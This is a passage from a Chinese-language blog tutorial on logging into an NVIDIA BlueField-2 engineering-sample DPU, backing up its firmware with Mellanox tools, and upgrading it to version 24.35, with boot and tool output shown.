href="#7、启动成功，修改默认账户和密码" class="headerlink" title="7、启动成功，修改默认账户和密码"></a>7、启动成功，修改默认账户和密码</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Mellanox BlueField-2 A1 BL1 V1.1</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No CDI passed to Riot core!</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: v2.2(release):3.9.3-4-g43fe858</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Built : 19:38:23, Oct 21 2022</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Booting BL2</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: v2.2(release):3.9.3-4-g43fe858</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: Built : 19:38:22, Oct 21 2022</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2 built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Running as MBF2M345A-VENOT_ system</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM0</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM1</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Finished initializing DDR</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  DDR POST passed.</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: v2.2(release):3.9.3-4-g43fe858</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: Built : 19:38:22, Oct 21 2022</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31 built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">UEFI firmware (version BlueField:3.9.3-7-g8f2d8ca built at 19:40:49 on Oct 21 2022)</span></span></code></pre></div></div></figure><p>ubuntu ubuntu</p><p>ubuntu Bf112233</p><h2 id="8、备份网卡固件"><a href="#8、备份网卡固件" class="headerlink" title="8、备份网卡固件"></a>8、备份网卡固件</h2><p>在宿主机上执行</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">status</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">modules:</span></span><span class="line"><span style="color: #61AFEF">------------</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">is</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">not</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">loaded</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">configuration</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">loaded</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices:</span></span><span class="line"><span style="color: #61AFEF">------------</span></span><span class="line"><span style="color: #61AFEF">/dev/mst/mt41686_pciconf0</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">-</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">configuration</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cycles</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">access.</span></span><span class="line"><span style="color: #ABB2BF">                                   </span><span style="color: #61AFEF">domain:bus:dev.fn</span><span style="color: #ABB2BF">=0000:06:00.0 </span><span style="color: #98C379">addr.reg=</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">data.reg=</span><span style="color: #D19A66">92</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cr_bar.gw_offset=</span><span style="color: #D19A66">-1</span></span><span class="line"><span style="color: #ABB2BF">                                   </span><span style="color: #61AFEF">Chip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">revision</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">is:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">01</span></span></code></pre></div></div></figure><p>备份固件命令，这里请根据具体的PCI地址来修改。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">flint</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">06</span><span style="color: #98C379">:00.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">query</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">full</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">flint_query.txt</span></span><span class="line"><span style="color: #61AFEF">flint</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">06</span><span style="color: #98C379">:00.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hw</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">query</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">flint_hwinfo.txt</span></span><span class="line"><span style="color: #61AFEF">flint</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">06</span><span style="color: #98C379">:00.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ri</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">orig_firmware.mlx</span></span><span class="line"><span style="color: #61AFEF">flint</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">06</span><span style="color: #98C379">:00.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">orig_firmware.ini</span></span><span class="line"><span style="color: #61AFEF">flint</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">06</span><span style="color: #98C379">:00.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rrom</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">orig_rom.mlx</span></span><span class="line"><span style="color: #61AFEF">mlxburn</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">06</span><span style="color: #98C379">:00.0</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-vpd</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">orig_vpd.txt</span></span></code></pre></div></div></figure><h2 id="9、启动-mst-服务，查询网卡版本"><a href="#9、启动-mst-服务，查询网卡版本" class="headerlink" title="9、启动 mst 服务，查询网卡版本"></a>9、启动 mst 服务，查询网卡版本</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">启动</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">服务</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">start</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Starting</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MST</span><span style="color: #ABB2BF"> (Mellanox </span><span style="color: #98C379">Software</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Tools</span><span style="color: #ABB2BF">) driver set</span></span><span class="line"><span style="color: #61AFEF">Loading</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">-</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Success</span></span><span class="line"><span style="color: #ABB2BF">[warn] mst_pciconf is already loaded, skipping</span></span><span class="line"><span style="color: #61AFEF">Create</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices</span></span><span class="line"><span style="color: #61AFEF">Unloading</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">module</span><span style="color: #ABB2BF"> (unused) - Success</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">查看</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">状态</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mst</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">status</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">modules:</span></span><span class="line"><span style="color: #61AFEF">------------</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">is</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">not</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">loaded</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">configuration</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">loaded</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">MST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices:</span></span><span class="line"><span style="color: #61AFEF">------------</span></span><span class="line"><span style="color: #61AFEF">/dev/mst/mt41686_pciconf0</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">-</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">configuration</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cycles</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">access.</span></span><span class="line"><span style="color: #ABB2BF">                                   </span><span style="color: #61AFEF">domain:bus:dev.fn</span><span style="color: #ABB2BF">=0000:03:00.0 </span><span style="color: #98C379">addr.reg=</span><span style="color: #D19A66">88</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">data.reg=</span><span style="color: #D19A66">92</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cr_bar.gw_1</span></span><span class="line"><span style="color: #ABB2BF">                                   </span><span style="color: #61AFEF">Chip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">revision</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">is:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">01</span></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">查询网卡版本信息</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mlxfwmanager</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Querying</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mellanox</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firmware</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">...</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">#1:</span></span><span class="line"><span style="color: #61AFEF">----------</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Type:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">BlueField2</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Part</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Number:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">MBF2M345A-VENOT_ES_Ax</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Description:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">NVIDIA</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">BlueField-2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">E-Series</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Eng.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">sample</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DPU</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">200GbE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">single-port</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">QSFP56</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">PCIe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Gent</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PSID:</span><span style="color: #ABB2BF">             </span><span style="color: #98C379">MT_0000000809</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Name:</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">/dev/mst/mt41686_pciconf0</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GUID:</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">b8cef60300f8d88a</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MAC:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">b8cef6f8d88a</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Versions:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">Current</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">Available</span><span style="color: #ABB2BF">     </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">FW</span><span style="color: #ABB2BF">             </span><span style="color: #D19A66">24.31</span><span style="color: #98C379">.0356</span><span style="color: #ABB2BF">     </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">PXE</span><span style="color: #ABB2BF">            </span><span style="color: #D19A66">3.6</span><span style="color: #98C379">.0401</span><span style="color: #ABB2BF">       </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF">           </span><span style="color: #D19A66">14.24</span><span style="color: #98C379">.0013</span><span style="color: #ABB2BF">     </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">blk</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">22.1</span><span style="color: #98C379">.0011</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">           </span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">net</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">21.1</span><span style="color: #98C379">.0011</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">           </span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Status:</span><span style="color: #ABB2BF">           </span><span style="color: #98C379">No</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">matching</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">image</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">found</span></span></code></pre></div></div></figure><h2 id="10、更新网卡固件到-24-35-版本"><a href="#10、更新网卡固件到-24-35-版本" class="headerlink" title="10、更新网卡固件到 24.35 版本"></a>10、更新网卡固件到 24.35 版本</h2><p>这个固件是包含在 DOCA 1.5.1 内的，据作者在评论区所说这是最后一个包含这个网卡 PSID 的最后一个版本系统。所以先刷 DOCA 1.5.1，再升级到 DOCA 2.7，再升级最新的网卡固件。能不能跳过这个步骤直接升级最新的网卡固件我不知道，我也不愿意试试，毕竟不便宜。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">更新固件</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/opt/mellanox/mlnx-fw-updater/firmware/mlxfwmanager_sriov_dis_aarch64_41686</span></span><span class="line"><span style="color: #61AFEF">Querying</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mellanox</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">devices</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firmware</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">...</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">#1:</span></span><span class="line"><span style="color: #61AFEF">----------</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Type:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">BlueField2</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Part</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Number:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">MBF2M345A-VENOT_ES_Ax</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Description:</span><span style="color: #ABB2BF">      </span><span style="color: #98C379">NVIDIA</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">BlueField-2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">E-Series</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Eng.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">sample</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DPU</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">200GbE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">single-port</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">QSFP56</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">PCIe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Gen4</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x16</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Secure</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Boot</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Disabled</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Crypto</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Enabled</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">16GB</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">on-board</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DDR</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">1GbE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">OOB</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">management</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PSID:</span><span style="color: #ABB2BF">             </span><span style="color: #98C379">MT_0000000809</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">PCI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Device</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Name:</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">/dev/mst/mt41686_pciconf0</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GUID:</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">b8cef60300f8d88a</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Base</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">MAC:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">b8cef6f8d88a</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Versions:</span><span style="color: #ABB2BF">         </span><span style="color: #98C379">Current</span><span style="color: #ABB2BF">        </span><span style="color: #98C379">Available</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">FW</span><span style="color: #ABB2BF">             </span><span style="color: #D19A66">24.31</span><span style="color: #98C379">.0356</span><span style="color: #ABB2BF">     </span><span style="color: #D19A66">24.35</span><span style="color: #98C379">.2000</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">NVMe</span><span style="color: #ABB2BF">           </span><span style="color: #98C379">N/A</span><span style="color: #ABB2BF">            </span><span style="color: #D19A66">20.4</span><span style="color: #98C379">.0001</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">PXE</span><span style="color: #ABB2BF">            </span><span style="color: #D19A66">3.6</span><span style="color: #98C379">.0401</span><span style="color: #ABB2BF">       </span><span style="color: #D19A66">3.6</span><span style="color: #98C379">.0805</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF">           </span><span style="color: #D19A66">14.24</span><span style="color: #98C379">.0013</span><span style="color: #ABB2BF">     </span><span style="color: #D19A66">14.28</span><span style="color: #98C379">.0016</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">blk</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">22.1</span><span style="color: #98C379">.0011</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">22.4</span><span style="color: #98C379">.0010</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #61AFEF">UEFI</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Virtio</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">net</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">21.1</span><span style="color: #98C379">.0011</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">21.4</span><span style="color: #98C379">.0010</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">Status:</span><span style="color: #ABB2BF">           </span><span style="color: #98C379">Update</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">required</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">---------</span></span><span class="line"><span style="color: #61AFEF">Found</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">device</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">s</span><span style="color: #ABB2BF">) </span><span style="color: #98C379">requiring</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firmware</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">update...</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">Perform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">FW</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">update?</span><span style="color: #ABB2BF"> [y/N]: y</span></span><span class="line"><span style="color: #61AFEF">Device</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">#1: Updating FW ...</span></span><span class="line"><span style="color: #61AFEF">FSMST_INITIALIZE</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">-</span><span style="color: #ABB2BF">   </span><span style="color: #98C379">OK</span></span><span class="line"><span style="color: #61AFEF">Writing</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Boot</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">image</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">component</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">-</span><span style="color: #ABB2BF">   </span><span style="color: #98C379">OK</span></span></code></pre></div></div></figure><h3 id="从系统内提取固件（不需要操作）"><a href="#从系统内提取固件（不需要操作）" class="headerlink" title="从系统内提取固件（不需要操作）"></a>从系统内提取固件（不需要操作）</h3><p>下面是提取这个固件的命令，我已经提取好了，不用再操作了</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ubuntu@192.168.100.2:/opt/mellanox/mlnx-fw-updater/firmware/mlxfwmanager_sriov_dis_aarch64_41686</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/</span></span></code></pre></div></div></figure><p>提取出来的固件解包通过 <a href="https://github.com/BeTeP-STH/mft-scripts">mft-scripts</a> 可以看到是有这个 PSID 的</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">81. MT_0000000809  MBF2M345A-VENOT_ES_Ax            NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disa</span></span></code></pre></div></div></figure><p>然后从 mlnx-fw-updater_23.10-3.2.2.0_arm64.deb 中解包找到了最新的固件 24.39.3560</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">57. MT_0000000809  MBF2M345A-VENOT_ES_Ax            NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disa</span></span></code></pre></div></div></figure><h2 id="11、冷重启电脑，查看网卡版本"><a href="#11、冷重启电脑，查看网卡版本" class="headerlink" 